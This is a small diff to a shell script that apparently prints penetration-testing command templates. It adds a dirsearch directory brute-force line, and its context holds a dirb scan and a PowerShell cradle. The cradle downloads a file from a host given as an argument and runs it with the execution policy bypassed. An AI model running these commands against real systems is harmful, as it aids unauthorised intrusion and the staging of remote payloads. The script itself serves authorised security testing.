@@ -7,6 +7,9 @@ printf "\n\n"
 printf "dirb http://$1"
 printf "\n\n"
 
+printf "dirsearch.py -u http://$ip -e aspx -f -t 20"
+printf "\n\n"
+
 printf "echo $wc=New-Object Net.WebClient>w.ps1 && echo $u=\"http://$1/$3\">>w.ps1 && echo $f=$3>>w.ps1 && echo $wc.DownloadFile($u,$f)>>w.ps1"
 printf "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File w.ps1"
 printf "\n\n"
